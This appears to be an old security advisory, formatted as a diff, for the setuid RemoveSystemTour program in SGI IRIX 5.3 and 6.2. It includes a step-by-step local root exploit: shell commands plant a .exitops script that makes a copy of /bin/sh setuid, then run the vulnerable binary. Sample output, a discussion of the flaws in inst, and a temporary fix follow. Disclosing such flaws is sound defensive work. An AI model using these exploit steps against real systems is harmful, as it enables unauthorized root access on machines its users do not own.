@@ -1,0 +1,52 @@
+
+PROBLEM. systour
+AFFECTS. SGI IRIX 5.3 and 6.2 with the systour package available.
+REQUIRED. account on server
+RISK. root compromise, denial of service, etc.
+
+---
+
+Exploit:
+
+First, we set up an environment for running inst. dryrun is set to true
+because we are considerate environmentalists.
+
+$ rbase=$HOME; export rbase
+$ mkdir -p $HOME/var/inst
+$ echo "dryrun: true" > $HOME/.swmgrrc
+
+These three lines should be very familiar to all exploitors.
+
+$ cp -p /bin/sh /tmp/foobar
+$ printf '#\!/bin/sh\nchmod 4777 /tmp/foobar\n' > $HOME/var/inst/.exitops
+$ chmod a+x $HOME/var/inst/.exitops
+
+Now run it.
+
+$ /usr/lib/tour/bin/RemoveSystemTour
+Executing outstanding exit-commands from previous session ..
+Successfully completed exit-commands from previous session.
+Reading installation history
+Checking dependencies
+ERROR : Software Manager: automatic installation failed: New target
+(nothing installed) and no distribution.
+
+---
+
+DISCUSSION. The easiest solution is to replace RemoveSystemTour with
+a binary that checks the password. However, RemoveSystemTour may not be
+the only way to access inst, and so these general recommendations apply:
+
+inst should check UID and lock configuration options when called non-
+interactively from versions and with euid 0. inst also has a race
+condition on the file /tmp/shPID0, the shell script it creates to make the
+appropriate directory (rbase). inst should verify the variables it
+uses--by relying on an external shell script, environment variables, IFS,
+etc. can be tampered with. Finally, inst will happily overwrite logfiles
+specified in the .swmgrrc file and creat() the shell script over anything.
+
+---
+
+TEMPORARY FIX. Either remove the system tour or chmod -s the
+RemoveSystemTour binary.
+
